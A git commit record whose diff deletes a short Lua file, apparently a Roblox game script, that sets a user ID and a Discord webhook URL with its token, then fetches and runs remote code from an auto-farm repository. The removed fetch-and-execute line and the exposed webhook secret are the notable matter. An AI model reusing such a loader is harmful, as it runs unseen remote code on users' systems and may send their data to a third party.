0fbb60c4cb0ab36563b6f727c55de7e363c95097
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-30 13:10:47 +0300

    Delete Hub.lua

--- Hub.lua
+++
@@ -1,3 +0,0 @@
-_G.UserID = 1803819784
-_G.WebHook = "https://discord.com/api/webhooks/1058318330072666122/3WngiAz0LLI3zMte4kTDJqafFXkSikPMOuLEy_nXx8PM36vdNs5khU_O57c36fUDw1HK"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
